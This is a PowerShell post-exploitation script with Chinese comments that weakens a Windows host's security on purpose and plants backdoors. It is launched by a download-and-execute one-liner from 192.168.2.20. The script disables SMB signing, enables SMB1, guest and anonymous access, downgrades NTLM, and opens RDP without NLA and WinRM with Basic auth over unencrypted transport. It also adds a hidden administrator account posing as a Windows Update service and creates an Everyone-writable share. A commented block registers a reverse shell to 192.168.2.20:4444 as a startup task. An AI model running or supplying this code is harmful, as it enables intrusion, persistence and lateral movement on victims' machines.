<#
.SYNOPSIS
    Windows 攻击面开启 / 后门加固载荷（PowerShell 版，等价于 smb_open_backdoor.bat 并扩展）
.DESCRIPTION
    在已获得管理员权限的目标机上运行。全部改为可逆，末尾附回滚段（-Revert 开关）。
.USAGE
    powershell -ep bypass -c "irm http://192.168.2.20:8081/open.ps1 | iex"
    或本地: powershell -ep bypass -File open.ps1
    回滚:  powershell -ep bypass -File open.ps1 -Revert
.NOTES
    需管理员权限；部分项需重启生效。
#>
[CmdletBinding()]
param(
    [switch]$Revert,
    [string]$BackdoorUser = "svc_winupd$",
    [string]$BackdoorPass = "P@ssw0rd!2024",
    [string]$SharePath    = "C:\ProgramData\SysCache",
    [string]$ShareName    = "SYSVOL_CACHE"
)

$ErrorActionPreference = "SilentlyContinue"
function Ok($m){ Write-Host "[+] $m" -ForegroundColor Green }
function Err($m){ Write-Host "[!] $m" -ForegroundColor Yellow }

# 权限检查
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] 需要管理员权限" -ForegroundColor Red; exit 1
}

if ($Revert) {
    Write-Host "=== 回滚模式 ===" -ForegroundColor Cyan
    # 防火墙规则
    foreach($r in @("SMB-TCP-445","SMB-TCP-139","SMB-UDP-137-138","RPC-135","RDP-3389","WinRM-5985","WinRM-5986","SMB-ALL-OUT","ICMP-ALLOW")){
        Remove-NetFirewallRule -DisplayName $r -ErrorAction SilentlyContinue
    }
    Ok "防火墙规则已移除"
    # SMB 签名恢复
    Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true -Force
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" RequireSecuritySignature 0
    Ok "SMB 签名已恢复"
    # 匿名/来宾收紧
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" RestrictNullSessAccess 1
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" AllowInsecureGuestAuth 0
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" RestrictAnonymous 1
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" RestrictAnonymousSAM 1
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" EveryoneIncludesAnonymous 0
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" LmCompatibilityLevel 5
    net user guest /active:no | Out-Null
    Ok "匿名/来宾策略已收紧, LmCompat=5"
    # UAC 远程
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" LocalAccountTokenFilterPolicy 0
    Ok "LocalAccountTokenFilterPolicy 已归零"
    # RDP
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" fDenyTSConnections 1
    Ok "RDP 已关闭"
    # WinRM
    Stop-Service WinRM -Force; Set-Service WinRM -StartupType Disabled
    Ok "WinRM 已停止"
    # 账号与共享
    net user $BackdoorUser /delete | Out-Null
    Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $BackdoorUser -ErrorAction SilentlyContinue
    net share $ShareName /delete | Out-Null
    Remove-Item $SharePath -Recurse -Force -ErrorAction SilentlyContinue
    Ok "后门账号/共享已清除"
    # 计划任务
    Get-ScheduledTask | Where-Object {$_.TaskName -like "WinUpd*"} | Unregister-ScheduledTask -Confirm:$false
    Ok "计划任务已清除"
    Write-Host "=== 回滚完成，建议重启 ===" -ForegroundColor Cyan
    return
}

Write-Host "=== 开启攻击面 ===" -ForegroundColor Cyan

# ---------- 1. SMB 服务与组件 ----------
dism /online /enable-feature /featurename:SMB1Protocol /all /norestart | Out-Null
Set-Service LanmanServer -StartupType Automatic
Set-Service LanmanWorkstation -StartupType Automatic
Start-Service LanmanServer, LanmanWorkstation
Ok "SMB 服务已启动, SMB1 组件已启用"

# ---------- 2. 关闭 SMB 签名（中继前提） ----------
Set-SmbServerConfiguration -RequireSecuritySignature $false -EnableSecuritySignature $false -Force
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" RequireSecuritySignature 0
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" EnableSecuritySignature 0
Ok "SMB 签名已关闭（可中继）"

# ---------- 3. 匿名/来宾访问 ----------
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" RestrictNullSessAccess 0
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" AllowInsecureGuestAuth 1
"RestrictAnonymous","RestrictAnonymousSAM","EveryoneIncludesAnonymous" | ForEach-Object {
    $v = if ($_ -eq "EveryoneIncludesAnonymous") {1} else {0}
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" $_ $v
}
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" LimitBlankPasswordUse 0
net user guest /active:yes | Out-Null
net user guest /passwordreq:no | Out-Null
Ok "匿名/来宾访问已开启"

# ---------- 4. NTLM 降级（抓包可破） ----------
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" LmCompatibilityLevel 2
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" NtlmMinClientSec 0
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" RestrictSendingNTLMTraffic 0
Ok "LmCompatibilityLevel=2（NTLMv1 可破）"

# ---------- 5. 防火墙放行 ----------
$rules = @(
    @{N="SMB-TCP-445"; P="TCP"; L=445},  @{N="SMB-TCP-139"; P="TCP"; L=139},
    @{N="SMB-UDP-137-138"; P="UDP"; L="137,138"}, @{N="RPC-135"; P="TCP"; L=135},
    @{N="RDP-3389"; P="TCP"; L=3389},    @{N="WinRM-5985"; P="TCP"; L=5985},
    @{N="WinRM-5986"; P="TCP"; L=5986}
)
foreach($r in $rules){
    Remove-NetFirewallRule -DisplayName $r.N -ErrorAction SilentlyContinue
    New-NetFirewallRule -DisplayName $r.N -Direction Inbound -Action Allow -Protocol $r.P -LocalPort $r.L | Out-Null
}
New-NetFirewallRule -DisplayName "ICMP-ALLOW" -Direction Inbound -Action Allow -Protocol ICMPv4 | Out-Null
Ok "防火墙已放行 445/139/135/3389/5985/5986/ICMP"

# ---------- 6. RDP 开启（NLA 关闭） ----------
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" fDenyTSConnections 0
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" UserAuthentication 0
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" SecurityLayer 0
Enable-NetFirewallRule -Group "remote desktop" -ErrorAction SilentlyContinue
Ok "RDP 已开启（NLA 关闭，口令可直连）"

# ---------- 7. WinRM（远程管理，横向利器） ----------
Set-Service WinRM -StartupType Automatic; Start-Service WinRM
winrm quickconfig -quiet -force | Out-Null
winrm set winrm/config/service/auth '@{Basic="true"}' | Out-Null
winrm set winrm/config/service '@{AllowUnencrypted="true"}' | Out-Null
Ok "WinRM 已开启（AllowUnencrypted+Basic）"

# ---------- 8. 关闭 UAC 远程限制（psexec 关键） ----------
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" LocalAccountTokenFilterPolicy 1
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" FilterAdministratorToken 0
Ok "LocalAccountTokenFilterPolicy=1（管理员可远程）"

# ---------- 9. 后门账号 ----------
net user $BackdoorUser /delete 2>$null | Out-Null
net user $BackdoorUser $BackdoorPass /add /expires:never /comment:"Windows Update Service" | Out-Null
net localgroup administrators $BackdoorUser /add | Out-Null
net localgroup "Remote Desktop Users" $BackdoorUser /add | Out-Null
New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force | Out-Null
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" $BackdoorUser 0
Ok "后门账号 $BackdoorUser / $BackdoorPass 已建立（管理员+远程桌面，登录界面隐藏）"

# ---------- 10. 可写共享 ----------
New-Item -ItemType Directory -Path $SharePath -Force | Out-Null
icacls $SharePath /grant "Everyone:(OI)(CI)F" /t | Out-Null
net share $ShareName=$SharePath /grant:Everyone,FULL | Out-Null
Ok "共享 \\$env:COMPUTERNAME\$ShareName -> $SharePath（Everyone 完全控制）"

# ---------- 11. 计划任务持久化（开机拉起反向 shell，可选） ----------
# 取消下面注释并填跳板地址即可自动回连
<#
$task = @"
`$c = New-Object Net.Sockets.TCPClient('192.168.2.20',4444);
`$s = `$c.GetStream();
`$r = New-Object IO.StreamReader(`$s);
`$w = New-Object IO.StreamWriter(`$s);
`$w.AutoFlush = `$true;
`$w.WriteLine((whoami));
while((`$l = `$r.ReadLine()) -ne 'exit'){ `$o = iex `$l 2>&1 | Out-String; `$w.WriteLine(`$o) }
"@
$act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -ep bypass -c `"$task`""
$trg = New-ScheduledTaskTrigger -AtStartup
$prn = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WinUpdHealthCheck" -Action $act -Trigger $trg -Principal $prn -Force | Out-Null
Ok "计划任务 WinUpdHealthCheck 已注册（开机反向 shell）"
#>

# ---------- 状态汇总 ----------
Write-Host "`n=== 当前状态 ===" -ForegroundColor Cyan
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol,RequireSecuritySignature,EnableSecuritySignature | Format-List
Get-NetFirewallRule -DisplayName "SMB-*","RDP-*","WinRM-*" | Select-Object DisplayName,Enabled,Action | Format-Table -AutoSize
net user $BackdoorUser | Select-String "Account active|Local Group"
net share | Select-String $ShareName
Write-Host "[i] 部分设置需重启生效: Restart-Computer -Force" -ForegroundColor Yellow
